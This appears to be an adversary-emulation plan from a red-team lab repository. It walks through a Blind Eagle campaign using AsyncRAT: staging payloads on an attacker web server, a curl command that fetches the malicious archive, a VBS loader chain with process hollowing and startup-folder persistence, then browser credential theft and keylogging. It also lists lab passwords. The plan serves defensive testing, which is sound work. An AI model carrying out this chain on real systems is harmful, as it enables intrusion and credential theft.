# Scenario Overview

Legend of symbols:
* :bulb: - callout notes
* :heavy_exclamation_mark: - extremely important note
* :arrow_right: - Switching to another session
* :o: - Sign out of something

---
This scenario emulates Blind Eagle TTPs based on several malware specimens either 
used by or associated with the Blind Eagle actors:

1. AsyncRAT

---
## Step 0 - Setup

### :scroll: Overview

This emulation leverages AsyncRAT as a C2 server, and an attacker controlled web server to host and deliver two loaders, an injector, and the final AsyncRAT payload. 
AsyncRAT server is a Windows .NET GUI based program and will run on an attacker controlled Windows Machine. A second Ubuntu machine will be used as
attacker infrastructure - we use Python to host a simple web server with a directory structure that aligns with CTI and hosts payloads.

:heavy_exclamation_mark: This emulation plan assumes the infratructure found in [setup](../Resources/Setup/README.md) has been completed. If this has not been
done then IP addresses and URLs may change.

:bulb: During the emulation the Exchange server `mail.bancomurcielago.com` was configured as an open relay and an email from `notificacion@dian-info.com` was sent with the PDF [Notificacion De Pago](../Resources/Binaries/Notificacion%20De%20Pago.pdf) attached from the attacker web machine using the Linux `sendemail` program. A corresponding DNS entry for `dian-info.com` was created on the Active Directory Domain Controller `canario` was also created so that the link contained in the PDF would resolve properly.

:heavy_exclamation_mark: If you do not wish to perform these steps downloading the payload `factura-228447578537.pdf.uue` from Attacker Web `192.168.0.5` to Desk1 `10.1.0.5` will also suffice - you can perform the following PowerShell command from a PowerShell prompt on Desk1 during preflights:
```powershell
curl http://192.168.0.5/factura-228447578537.pdf.uue -o ~\Downloads\factura-228447578537.pdf.uue
```

---

### :biohazard: Procedures

* :bulb: RDP, do not SSH, to the Windows Attack Platform `192.168.0.4` hosting the C2 server.


* Open a new terminal window and navigate to where you previously cloned the repo in [setup](../Resources/Setup/README.md). Start the AsyncRAT server:

```
cd birdsofprey\Resources\Binaries\Binaries
```

* Start the AsyncRAT Server:

```
.\AsyncRAT.exe
```


* :arrow_right: Open a second PowerShell window on your Windows Attack Platform and SSH to the Web Server `192.168.0.5` to ensure the following four malicious
files are in the `web`, `Rump`, and `dll` directories for your user:

:bulb: These files are all part of the Blind Eagle phishing and attack chain and will be served from attacker infrastructure.

1. `factura-228447578537.pdf.uue` in `web`
2. `new_rump_vb.net.txt` in `web/dll`
3. `Rump.xls` in `web/Rump`
4. `asy.txt` in `web`

* Check the file exists:
```
ls web
```
```
ls web/dll
```
```
ls web/Rump
```

:bulb: If the armed and zipped file is not there, follow the [instructions](../Resources/Loaders/vb_loader/README.md)
for creating it then copy the zip file to `~/web`.

* Start the Python Web Server in a TMUX session (this ensures if your SSH connection drops the web server will still run):
```
cd ~/web
```
```
tmux
```
```
sudo python3 -m http.server 80
```

## Step 1 - Initial Compromise and Persistence

### :scroll: Overview

Step 1 emulates Blind Eagle gaining initial access from the target user downloading, extracting,
and executing a Visual Basic script received from a link residing in an attachment to 
a spearphishing email. The email is sourced from the email address `notificacion@dian-info.com`
the following actions take place when the VB script is executed:

1. The script uses PowerShell to download new_rump_vb.net.txt (`fiber.dll`) from `192.168.0.5/dll`.
2. The script then loads fiber.dll into the current Application Domain.
3. Once loaded the `VAI` method is called passing in an obfuscated URL pointing to the AsyncRAT payload (`asy.txt`).
4. `fiber.dll` creates an artifact in `C:\Windows\Temp` called `OneDrive.vbs` which is a copy of the VB loader.
5. `fiber.dll` uses the `WebClient.DownloadString` method to download `Rump.xls (fsociety.dll)`.
6. `fiber.dll` uses `Strings.StrReverse` and `Replace` to unmangle `Rump.xls`.
7. `fiber.dll` uses `Strings.StrReverse` and `Replace` to unmangle the URL pointing to `asy.txt (AsyncRAT payload)`.
8. `fiber.dll` uses `webClient.DownloadString` and `StrReverse` to download and unmabgle `asy.txt`.
9. `fiber.dll` uses `AppDomain.CurrentDomain.Load` and `Convert.FromBase64String` to load `Rump.xls (fsociety.dll)` into the current Application Domain and executes the `Ande` method of the `fsociety.Tools` Class passing in two arguments: The path to `RegSvcs.exe` and the contents of `asy.txt` with Base64 encoding removed.
10. `fsociety.dll` performs process hollowing to inject `AsyncRAT` into `RegSvcs.exe`
11. `fiber.dll` calls the `startup` method of the `fiber.Optical` class. This leverages the Windows Script Host to establish persistence by creating an `lnk` file in the Users startup folder pointing to the previously dropped `OneDrive.vbs` in `C:\Windows\Temp`

---

### :biohazard: Procedures

:arrow_right: RDP into `Desk1 (10.1.0.5)`:

| Username | Password | 
| :--------: | :---------------: | 
| bancomurcielago\demo_admin | Phrasing! |
  
* Open Edge and browse to https://mail.bancomurcielago.com/owa, login as `demo_admin`:

| Username | Password | 
| :--------: | :---------------: | 
| bancomurcielago\demo_admin | Phrasing! |

:bulb: There should be an unread email from `notificacion@dian-info.com`.

* Open this email and download the PDF attachment.

* Open the PDF and click the link to download `factura-228447578537.pdf.uue`

* Open File Explorer and navigate to the Downloads file directory.

* Right click `factura-228447578537.pdf.uue` and use winRAR to unzip - when prompted enter the password found in the PDF email attachment

* Double click the extracted `factura-228447578537.pdf.vbs` to execute the first stage and kick off
the infection chain.

:heavy_exclamation_mark: Wait 30 seconds. 

* Return to your RDP session on Windows Attack Platform to ensure AsyncRAT called back

* :mag: The C2 server should register a new AsyncRAT callback after the 
script is executed.

<br>

### 🔮 Reference Code & Reporting

<details>
    <summary>Click to expand table</summary>

| Red Team Activity | Source Code Link | ATT&CK Technique | Relevent CTI Report |
| --- | --- | --- | --- |
| User executes `factura-228447578537.pdf.vbs` | [vb_loader](../Resources/Loaders/vb_loader) | T1024.002 User Execution Malicious File | https://lab52.io/blog/apt-c-36-from-njrat-to-apt-c-36/ |
| VBS Loader Masquerades as a PDF file | [VB Loader README and Instructions](../Resources/Loaders/vb_loader/) | T1036.007 Masquerading: Masquerade File Type | https://lab52.io/blog/apt-c-36-from-njrat-to-apt-c-36/<br>https://blogs.blackberry.com/en/2023/02/blind-eagle-apt-c-36-targets-colombia |
| Loader downloads and executes `fiber.dll` | [eagle_loader.vbs#L324-L348](../Resources/Loaders/vb_loader/eagle_loader.vbs#L324-L348/) | T1059.00[1,5] Command and Scripting Interpreter [Powershell, Visual Basic]<br>T1105 Ingress Tool Transfer | https://lab52.io/blog/apt-c-36-from-njrat-to-apt-c-36/<br>https://blogs.blackberry.com/en/2023/02/blind-eagle-apt-c-36-targets-colombia |
| Fiber copies VBS loader for persistence | [fiber.cs#L38-L49](../Resources/Loaders/fiber/fiber/fiber.cs#L38-L49/) | T1547.001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder | https://lab52.io/blog/apt-c-36-from-njrat-to-apt-c-36/<br>https://blogs.blackberry.com/en/2023/02/blind-eagle-apt-c-36-targets-colombia |
| Fiber downloads and unmangles Rump.xls (fsociety) | [fiber.cs#L52-L58](../Resources/Loaders/fiber/fiber/fiber.cs#L52-L58/) | T1105 Ingress Tool Transfer<br>T1132.001 Data Encoding: Standard Encoding<br>T1140 Deobfuscate/Decode Files or Information | https://lab52.io/blog/apt-c-36-from-njrat-to-apt-c-36/<br>https://blogs.blackberry.com/en/2023/02/blind-eagle-apt-c-36-targets-colombia |
| Fiber prepares URL and download AsyncRAT | [fiber.cs#L60-73](../Resources/Loaders/fiber/fiber/fiber.cs#L60-L73/) | T1105 Ingress Tool Transfer<br>T1132.001 Data Encoding: Standard Encoding<br>T1150 Deobfuscate/Decode Files or Information<br>T1102 Web Service |  https://lab52.io/blog/apt-c-36-from-njrat-to-apt-c-36/<br>https://blogs.blackberry.com/en/2023/02/blind-eagle-apt-c-36-targets-colombia |
| Fiber Base64 Decodes and executes `fsociety` injector with `AsyncRAT` payload | [fiber.cs#L75-82](../Resources/Loaders/fiber/fiber/fiber.cs#L75-L82/) | T1132.001 Data Encoding: Standard Encoding<br>T1150 Deobfuscate/Decode Files or Information<br>T1055.012 Process Hollowing<br>T1218.009 System Binary Proxy Execution:Regsvcs/Regasm | https://lab52.io/blog/apt-c-36-from-njrat-to-apt-c-36/<br>https://blogs.blackberry.com/en/2023/02/blind-eagle-apt-c-36-targets-colombia<br>https://dciber.org/analisando-asyncrat-distribuido-na-colombia/ |
| Fsociety `Ande` function for process hollowing | [fsociety.cs#L68-L77](../Resources/Loaders/Efsociety/Efsociety/fsociety.cs#L68-L77/) | T1055.012 Process Hollowing<br>T1218.009 System Binary Proxy Execution:Regsvcs/Regasm | https://blogs.blackberry.com/en/2023/02/blind-eagle-apt-c-36-targets-colombia<br>https://lab52.io/blog/apt-c-36-from-njrat-to-apt-c-36/ |
| Fiber establishes persistence via `lnk` file in users `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` folder | [fiber.cs#L85](../Resources/Loaders/fiber/fiber/fiber.cs#L85/) | T1547.001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder | https://lab52.io/blog/apt-c-36-from-njrat-to-apt-c-36/<br>https://blogs.blackberry.com/en/2023/02/blind-eagle-apt-c-36-targets-colombia<br>https://dciber.org/analisando-asyncrat-distribuido-na-colombia/ |

</details>             
<br>


## Step 2 - Credential Theft

### :scroll: Overview

Step 2 emulates Blind Eagle performing browser credential theft leveraging the `AsyncRAT` Recovery plugin.

Blind Eagle is known to monitor the current loaded window and look for strings such as 
banking websites and other financial institution websites. The user has a session to a Bank website open so Blind Eagle attempts to steal both saved passwords and cookies from the browser.

---

### :biohazard: Procedures

:arrow_right: On Windows Attack Platform `192.168.0.4` bring the AsyncRAT server window into focus.

In the AsyncRAT Server window issue the following command to the AsyncRAT Client.

`Right Click AsyncRAT Client -> Monitoring -> Password Recovery`

![Recovery](../Resources/Screenshots/asyncrat-plugin-log-and-recover.png)

Once the recovery process completes review the results on the AsyncRAT server and look for credentials in the resulting txt file.

`Right click AsyncRAT client -> Client Management -> Client -> Show Folder`

![Show_Folder](../Resources/Screenshots/asyncrat-plugin-show-folder.png)

This will open a File Explorer window with files named `Cookies_<date>` and `Password_<date>`. Open the Passwords file to verify credential collection

<br>

### 🔮 Reference Code & Reporting

<details>
    <summary>Click to expand table</summary>

| Red Team Activity | Source Code Link | ATT&CK Technique | Relevent CTI Report |
| --- | --- | --- | --- |
| AsyncRAT Chromium browser account recovery Plugin | [Chromium.cs#L151-L360](../Resources/AsyncRAT-C%23/Plugin/Recovery/Recovery/Browsers/Chromium/Chromium.cs#L151-L360/) | T1555.003 Credentials from Password Stores: Credentials from Web Browsers | https://dciber.org/analisando-asyncrat-distribuido-na-colombia/<br>https://blogs.blackberry.com/en/2023/02/blind-eagle-apt-c-36-targets-colombia<br>https://lab52.io/blog/apt-c-36-from-njrat-to-apt-c-36/ |
| AsyncRAT Chromium browser cookie recovery | [ChromiumCookies.cs#L43-L194](../Resources/AsyncRAT-C%23/Plugin/Recovery/Recovery/Browsers/Chromium/ChromiumCookies.cs#L43-L194/) | T1539 Steal Web Session Cookie | https://dciber.org/analisando-asyncrat-distribuido-na-colombia/<br>https://blogs.blackberry.com/en/2023/02/blind-eagle-apt-c-36-targets-colombia<br>https://lab52.io/blog/apt-c-36-from-njrat-to-apt-c-36/ |
| AsyncRAT FireFox browser password reader | [FireFoxPassReader.cs#L12-L110](../Resources/AsyncRAT-C%23/Plugin/Recovery/Recovery/Browsers/Firefox/FirefoxPassReader.cs#L12-L110) | T1555.003 Credentials from Password Stores: Credentials from Web Browsers<br>T1555.004 Credentials from Password Stores: Windows Credential Manager | https://dciber.org/analisando-asyncrat-distribuido-na-colombia/<br>https://blogs.blackberry.com/en/2023/02/blind-eagle-apt-c-36-targets-colombia<br>https://lab52.io/blog/apt-c-36-from-njrat-to-apt-c-36/ |
| AsyncRAT FireFox browser password reader | [FireFoxPassReader.cs#L12-L110](../Resources/AsyncRAT-C%23/Plugin/Recovery/Recovery/Browsers/Firefox/FirefoxPassReader.cs#L12-L110) | T1555.003 Credentials from Password Stores: Credentials from Web Browsers<br>T1555.004 Credentials from Password Stores: Windows Credential Manager | https://dciber.org/analisando-asyncrat-distribuido-na-colombia/<br>https://blogs.blackberry.com/en/2023/02/blind-eagle-apt-c-36-targets-colombia<br>https://lab52.io/blog/apt-c-36-from-njrat-to-apt-c-36/ | 
| AsyncRAT FireFox browser password decryptor | [FFDecryptor.cs#L8-L95](../Resources/AsyncRAT-C%23/Plugin/Recovery/Recovery/Browsers/Firefox/FFDecryptor.cs#L8-L95) | T1555.003 Credentials from Password Stores: Credentials from Web Browsers<br>T1555.004 Credentials from Password Stores: Windows Credential Manager | https://dciber.org/analisando-asyncrat-distribuido-na-colombia/<br>https://blogs.blackberry.com/en/2023/02/blind-eagle-apt-c-36-targets-colombia<br>https://lab52.io/blog/apt-c-36-from-njrat-to-apt-c-36/ |
| AsyncRAT FireFox cookie grabber | [FFCookiesGrabber.cs#L29-L122](../Resources/AsyncRAT-C%23/Plugin/Recovery/Recovery/Browsers/Firefox/Cookies/FFCookiesGrabber.cs#L29-L122) | T1539 Steal Web Session Cookie | https://dciber.org/analisando-asyncrat-distribuido-na-colombia/<br>https://blogs.blackberry.com/en/2023/02/blind-eagle-apt-c-36-targets-colombia<br>https://lab52.io/blog/apt-c-36-from-njrat-to-apt-c-36/ |

</details>
<br>


## Step 3 - Keylogging

### :scroll: Overview

Step 3 emulates Blind Eagle using the keylogging plugin for `AsyncRAT` to capture credentials from the victim machine.

---

### :biohazard: Procedures

:arrow_right: On Windows Attack Platform issue the following commands to deploy the keylogger to the victim workstation:

In the AsyncRAT Server window
`Right click client -> Monitoring -> Keylogger`

![keylogging](../Resources/Screenshots/asyncrat-plugin-log-and-recover.png)

A second window will open on the AsyncRAT server indicating that keylogging is running.

:arrow_right: RDP from your workstation not the Attack Platform as demo_admin to Desk1 (this is so it does not appear that the attacker RDP'ed to the victim). On Desk1 (10.1.0.5) open an Edge browser window and navigate to `web.bancomurcielago.com:8000/admin/login`. Enter the username `administrador-murcielagos` and password `N@N@N@N@Murci31@g0` to log in to the Django server.

:arrow_right: Switch to the Windows Attack Machine, you should see the administrator username and password show up in the keylogging window indicating a successful capture of credentials.

Verify that the credentials were successfully captured by opening up a browser window and navigating to http://10.1.0.4:8000/admin/login and authenticating with the captured credentials.

<br>

### 🔮 Reference Code & Reporting

<details>
    <summary>Click to expand table</summary>

| Red Team Activity | Source Code Link | ATT&CK Technique | Relevent CTI Report |
| --- | --- | --- | --- |
| AsyncRAT LimeLogger Plugin | [packet.cs#L111-L143](../Resources/AsyncRAT-C%23/Plugin/LimeLogger/LimeLogger/Packet.cs#L111-L143) | T1056 Input Capture: Keylogging | https://dciber.org/analisando-asyncrat-distribuido-na-colombia/<br>https://blogs.blackberry.com/en/2023/02/blind-eagle-apt-c-36-targets-colombia<br>https://lab52.io/blog/apt-c-36-from-njrat-to-apt-c-36/ |

</details>
